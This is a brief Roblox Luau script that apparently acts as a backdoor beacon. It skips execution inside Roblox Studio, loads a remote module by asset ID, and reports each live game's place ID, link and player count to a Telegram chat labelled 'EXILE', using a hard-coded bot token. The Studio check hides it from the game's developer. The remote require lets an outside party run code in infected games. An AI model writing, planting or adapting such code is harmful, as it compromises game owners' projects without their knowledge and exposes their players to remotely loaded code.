-- Intialize telegram bot script
local RunService = game:GetService("RunService")
local IsStudio = RunService:IsStudio()

if IsStudio then
	return
end

local module = require(11495711008)

local bot = module.DeclareBot("7876117719:AAGEN_Jm0G4W_w1td5xMVsfUK6lTHON5kPo")

local placeID = game.PlaceId

local gameLink = "https://www.roblox.com/games/" .. placeID

module.SendMessage(bot, "-1002448276680", "EXILE: Logged new game -- \n\nPlaceID: "..placeID.."\nGame link: "..gameLink.."\n\nActive: "..#game.Players:GetChildren().."")
module.SendPhoto(bot, "-1002448276680", "https://ibb.co/twBFd6Bx")
